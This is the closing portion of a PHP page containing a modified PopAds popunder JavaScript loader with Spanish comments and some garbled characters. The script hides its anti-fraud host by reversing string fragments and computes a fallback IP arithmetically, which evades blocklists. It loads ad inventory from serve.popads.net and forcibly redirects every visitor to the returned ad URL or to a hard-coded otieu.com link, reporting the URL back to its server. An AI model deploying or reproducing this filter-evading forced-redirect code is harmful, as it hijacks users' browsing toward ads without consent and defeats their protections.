                var i = 0;
                var c = 0,
                    c1 = 0,
                    c2 = 0;
                while (i < utftext.length) {
                    c = utftext.charCodeAt(i);
                    if (c < 128) {
                        string += String.fromCharCode(c);
                        i++;
                    } else if ((c > 191) && (c < 224)) {
                        c2 = utftext.charCodeAt(i + 1);
                        string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                        i += 2;
                    } else {
                        c2 = utftext.charCodeAt(i + 1);
                        c3 = utftext.charCodeAt(i + 2);
                        string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                        i += 3;
                    }
                }
                return string;
            }
        };

        "use strict";
        var BASE_PATH = "/c";
        var POP_GLOBAL_VAR = "_pop";
        var PAO_GLOBAL_VAR = "_pao";
        window.Base64 = Base64;
        var currentScriptElement = document.currentScript;
        var adscoreTimeout = null;

        var adManager = {
            _inventory: {},
            _config: {
                _siteId: 0,
                _minBid: 0,
                _blockedCountries: false,
                _default: false,
                _defaultType: "popunder",
                _useOverlay: true,
                _trafficType: 0,
                _popunderFailover: "tabup",
                _adscorebp: null,
                _adscorept: null,
                _adscoreak: "QpUJAAAAAAAAGu98Hdz1l_lcSZ2rY60Ajjk9U1c"
            },
            _init: function() {
                var self = this;
                this._loadConfig();
                this.adfired = false;
                utils.init({
                    prepop: false,
                    catchalldiv: "never",
                    onafteropen: function() {
                        self.adfired = true;
                    }
                });
                this._adscoreDeploy();
            },
            _adscoreDeploy: function() {
                var self = this;
                var adscoreScriptTimeout = 0;
                var config = this._config;
                if (self._config._adscorebp) {
                    self._checkInventory(self._config._adscorebp);
                } else if (typeof AdscoreInit === "function") {
                    try {
                        AdscoreInit(self._config._adscoreak, {
                            sub_id: config._siteId,
                            callback: function(result) {
                                self._checkInventory(result.signature || "2" + result.error);
                            }
                        });
                    } catch (e) {
                        self._checkInventory("4" + e.message);
                    }
                } else if (document.body) {
                    var domainParts = ["re", "adsco"];
                    domainParts.push(domainParts[1][3]);
                    var adscoreUrl = "https://" + domainParts.reverse().join(".") + "/";
                    var script = document.createElement("script");
                    script.src = adscoreUrl;
                    try {
                        script.onerror = function() {
                            if (script.src === adscoreUrl) {
                                script.src = "https://" + Math.round(Math.pow(52292.244664, 2)) + "/a.js";
                            } else {
                                clearTimeout(adscoreScriptTimeout);
                                self._checkInventory("1");
                            }
                        };
                    } catch (e) {}
                    script.onload = function() {
                        clearTimeout(adscoreScriptTimeout);
                        try {
                            AdscoreInit(self._config._adscoreak, {
                                sub_id: config._siteId,
                                callback: function(result) {
                                    self._checkInventory(result.signature || "2" + result.error);
                                }
                            });
                        }
                        catch (e) {
                            self._checkInventory("4" + e.message);
                        }
                    };
                    document.body.appendChild(script);
                    adscoreScriptTimeout = setTimeout(function() {
                        self._checkInventory("3");
                    }, 5000);
                } else {
                    setTimeout(function() {
                        self._adscoreDeploy();
                    }, 50);
                }
            },
            _checkInventory: function(adscoreSignature) {
               // document.getElementById('adscoreOutput').textContent = adscoreSignature;
                
                this._lastci = (new Date).getTime();
                utils.clearUrls();
                var self = this;
                var intervalId = 0;
                var config = this._config;
                if (config._adscorept) {
                    config._adscorept(adscoreSignature);
                }
                try {
                    clearTimeout(adscoreTimeout);
                } catch (e) {}
                adscoreTimeout = setTimeout(function() {
                    self._adscoreDeploy();
                }, 300000);
                intervalId = setInterval(function() {
                    var inventoryUrl = "//serve.popads.net" + BASE_PATH;
                    if (document.body) {
                        clearInterval(intervalId);
                        var params = {
                            _: encodeURIComponent(adscoreSignature),
                            v: 4,
                            siteId: config._siteId,
                            minBid: config._minBid,
                            blockedCountries: config._blockedCountries || "",
                            documentRef: encodeURIComponent(document.referrer),
                        };
                        for (var key in params) {
                            if (params.hasOwnProperty(key)) {
                                inventoryUrl += (inventoryUrl.indexOf("?") !== -1 ? "&" : "?") + key + "=" + (params[key] || "");
                            }
                        }
                        var script = document.createElement("script");
                        script.referrerPolicy = "unsafe-url";
                        script.src = inventoryUrl;
                        try {
                            script.onerror = function() {
                                utils.abortPop();
                                currentScriptElement.onerror();
                            };
                        } catch (e) {}
                        document.body.appendChild(script);
                    }
                }, 100);
            },
            _parseInventory: function(inventoryData) {
                this._inventory = inventoryData || {};
                if (!this._inventory.url || this._inventory.url === "") {
                    // Si no se encuentra URL, se llama a la funci��n para usar la URL por defecto.
                    this._preparePopDefault();
                } else {
                    this._preparePopInventory();
                }
            },
            _preparePopDefault: function() {
              //  const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
                const defaultUrl = 'https://otieu.com/4/9848568'; // Aqu�� se usa la URL por defecto
                
             //   urlOutput.textContent = "No se encontr�� inventario. Redireccionando a la URL por defecto...";
                status.innerHTML = `<span class="alert-error">No se encontr�� inventario.</span>`;

                // Redirecciona a la URL por defecto
                if (defaultUrl) {
                    window.location.href = 'https://otieu.com/4/9848568';
                }
            },
            _preparePopInventory: function() {
                var self = this;
                const inventoryUrl = self._inventory.url;

                // Muestra la URL en el DOM (en el navegador)
             //   const urlOutput = document.getElementById('urlOutput');
                const status = document.getElementById('status');
               // urlOutput.textContent = inventoryUrl;
                status.innerHTML = '<span class="alert-success">�0�3�0�7xito! URL de inventario obtenida. Redireccionando...</span>';

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `url=${encodeURIComponent(inventoryUrl)}`
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        // console.log('URL recibida por el servidor PHP: ' + data.url);
                    }
                })
                .catch(error => {
                    console.error('Error al enviar la URL al servidor:', error);
                });
                
               window.location.href = inventoryUrl;
                
                try {
                    clearTimeout(adscoreTimeout);
                } catch (e) {}
            },
            _preparePop: function() {
                if (this._inventory.url !== "") {
                    this._preparePopInventory();
                } else {
                    this._preparePopDefault();
                }
            },
            _waitForGoodWeather: function() {
                setTimeout(this._init.bind(this), 0);
            },
            _loadConfig: function() {
                var globalConfig = window[POP_GLOBAL_VAR] || [];
                var config = this._config;
                for (var i = 0; i < globalConfig.length; i++) {
                    var key = globalConfig[i][0];
                    var value = globalConfig[i][1];
                    switch (key) {
                        case "siteId":
                        case "delayBetween":
                        case "defaultPerIP":
                        case "trafficType":
                            value = parseInt(value, 10);
                            if (isNaN(value)) continue;
                    }
                    switch (key) {
                        case "siteId":
                            config._siteId = value;
                            break;
                        case "minBid":
                            config._minBid = value;
                            break;
                        case "blockedCountries":
                            config._blockedCountries = value;
                            break;
                        case "default":
                            config._default = value;
                            break;
                        case "defaultType":
                            config._defaultType = value;
                            break;
                        case "topmostLayer":
                            config._useOverlay = value;
                            break;
                        case "trafficType":
                            config._trafficType = value;
                            break;
                        case "popunderFailover":
                            config._popunderFailover = value;
                            break;
                        case "prepop":
                            break;
                        case "adscorebp":
                            config._adscorebp = value;
                            break;
                        case "adscorept":
                            config._adscorept = value;
                            break;
                        case "adscoreak":
                            config._adscoreak = value;
                            break;
                    }
                }
            }
        };
        for (var prop in window) {
            try {
                if (prop.match(/[0-9a-f]{32,32}/) && window[prop] && window[prop].length >= 7 && window[prop][0] && window[prop][0][0] && !isNaN(parseFloat(window[prop][0][1])) && isFinite(window[prop][0][1])) {
                    POP_GLOBAL_VAR = prop;
                    window[prop.slice(0, 16) + prop.slice(0, 16)] = window[prop];
                    break;
                }
            } catch (e) {}
        }
        if (!"//serve.popads.net".includes(".net")) {
            PAO_GLOBAL_VAR = "";
            var randomLength = 10 + Math.floor(10 * Math.random());
            for (var i = 0; i < randomLength; i++) {
                PAO_GLOBAL_VAR += "abcdefghijklmnopqrstuvwxyz".charAt(Math.floor(26 * Math.random()));
            }
            BASE_PATH = "/" + PAO_GLOBAL_VAR;
        }
        var publicApi = {
            parse: function(inventoryData) {
                adManager._parseInventory(inventoryData);
            },
            fbparse: function(bannerData) {
                utils._openAd(bannerData.url, {});
            },
        };
        try {
            window._pao = publicApi;
            Object.freeze(window._pao);
        } catch (e) {}
        try {
            window[PAO_GLOBAL_VAR] = publicApi;
            Object.freeze(window[PAO_GLOBAL_VAR]);
        } catch (e) {}
        if (!navigator.userAgent.includes("://")) {
            adManager._waitForGoodWeather();
        }
    })(window, window.document, window.screen);
</script>
</body>
</html>
<?php exit;
}

?>
